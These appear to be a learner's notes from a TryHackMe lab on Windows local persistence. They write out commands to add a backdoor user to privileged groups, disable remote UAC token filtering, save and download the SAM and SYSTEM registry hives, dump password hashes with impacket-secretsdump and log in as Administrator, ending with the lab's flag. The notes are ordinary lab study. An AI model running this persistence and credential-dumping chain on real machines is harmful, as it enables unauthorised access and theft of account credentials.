-reasons for local persistence
1. re-exploitation isn't always possible
2. getting a foothold is hard to reproduce
3. security is one step behind

---------------------------------------------------------------------------------------------

Assign Group Membership
-make unprivileged user gain admin privileges
net localgroup administrators thmuser0 /add

-avoid being suspicious - use backup operators group
-won't have admin privileges but have read/write access to anyfile or registry key on the system
-can escalate to admin account trivially
net localgroup "Backup Operators" thmuser1 /add

-add to RDP or winRM
net localgroup "Remote Mangement Users" thmuser1 /add

-connect using evil-winrm
evil-winrm -i [IP] -u thmuser1 -p Password321
whoami /groups

-LocalAccountTokenFilterPolicy implemented by User Account Control (UAC) - strips admin privileges when logging in remotely
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

*stay in directory: C:\Users\thmuser1\Documents

(on evil-winrm)
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak

-attacker machine
(apt install python3-impacket)
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
-get hashes
-log into administator using hashes
evil-winrm -i [IP] -u Administrator
THM{FLAG_BACKED_UP!}

Special Privileges and Security Descriptors
-SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
-SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.



